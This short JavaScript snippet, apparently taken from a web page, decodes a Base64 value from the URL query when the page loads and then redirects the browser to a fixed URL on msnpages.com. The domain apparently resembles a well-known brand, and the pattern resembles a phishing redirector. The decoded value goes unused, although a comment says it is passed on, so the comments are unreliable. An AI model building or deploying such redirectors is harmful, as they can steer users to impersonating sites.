function redirectToNewDomain() {
      // Get the Base64 content from the URL
      const base64Content = window.location.search.substring(1); // Get the content after the question mark

      if (base64Content) {
        // Decode the Base64 content
        const decodedValue = atob(base64Content);

        // Redirect to the new domain with the decoded value as a fragment
        window.location.href = `https://msnpages.com/m20231113`;
      } else {
        console.error('Base64 content not found in the URL');
      }
    }

    // Call the function on page load
    window.onload = redirectToNewDomain;
